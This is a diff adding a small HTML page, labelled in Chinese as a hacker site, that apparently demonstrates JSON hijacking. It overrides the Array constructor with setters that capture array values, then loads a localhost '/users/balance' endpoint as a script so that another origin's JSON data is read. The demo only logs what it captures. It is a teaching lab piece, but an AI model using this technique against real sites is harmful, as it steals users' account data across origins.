@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    我是駭客網站
+    <script>
+      function Array() {
+        // 覆寫原生的 Array 函式，這裡面放惡意程式碼
+        // 這裡的範例只是將資料 alert
+        var that = this;
+        var index = 0;
+        var valueExtractor = function (value) {
+          // Alert the value
+          console.log(value);
+          // Set the next index to use this method as well
+          that.__defineSetter__(index.toString(), valueExtractor);
+          index++;
+        };
+        // Set the setter for item 0
+        that.__defineSetter__(index.toString(), valueExtractor);
+        index++;
+      }
+
+      new Proxy(Array.prototype, {
+        get: (target, key) => {
+          console.log("arr get", key);
+          return Reflect.get(target, key);
+        },
+        set: (target, key, value) => {
+          console.log("arr set", key);
+          Reflect.set(target, key, value);
+          return true;
+        },
+      });
+    </script>
+
+    <script src="http://localhost:8080/users/balance"></script>
+  </body>
+</html>
